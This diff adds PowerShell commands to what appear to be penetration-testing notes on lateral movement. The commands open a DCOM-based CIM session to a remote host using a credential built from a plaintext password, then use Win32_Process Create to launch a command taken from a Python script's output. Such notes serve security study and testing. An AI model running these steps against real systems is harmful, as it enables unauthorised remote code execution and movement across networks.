@@ -30,3 +30,15 @@ $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
 ```powershell
 $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
 ```
+```powershell
+$Options = New-CimSessionOption -Protocol DCOM
+```
+```powershell
+$Session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options
+```
+```powershell
+$Command = '$(OUTPUT_OF_PYTHON_SCRIPT)';
+```
+```powershell
+Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
+```
